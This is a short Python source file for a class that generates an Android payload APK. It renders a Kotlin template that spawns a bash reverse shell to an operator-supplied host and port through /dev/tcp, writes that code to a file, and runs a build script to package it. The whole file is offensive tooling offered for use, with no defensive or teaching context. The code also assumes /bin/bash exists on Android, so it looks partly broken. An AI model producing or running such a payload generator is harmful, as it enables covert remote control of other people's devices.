import os
import subprocess
from jinja2 import Template

class AndroidPayload:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def generate_apk(self, output_path="payload.apk"):
        template = """
        fun main() {
            Runtime.getRuntime().exec(arrayOf("/bin/bash", "-c", "bash -i >& /dev/tcp/{{ lhost }}/{{ lport }} 0>&1"))
        }
        """
        rendered = Template(template).render(lhost=self.lhost, lport=self.lport)
        
        with open("android/payload.kt", "w") as f:
            f.write(rendered)
        
        if os.name == "posix":
            subprocess.run(["./android/build.sh"], cwd=os.getcwd())
        else:
            subprocess.run(["./android/build.bat"], shell=True, cwd=os.getcwd())
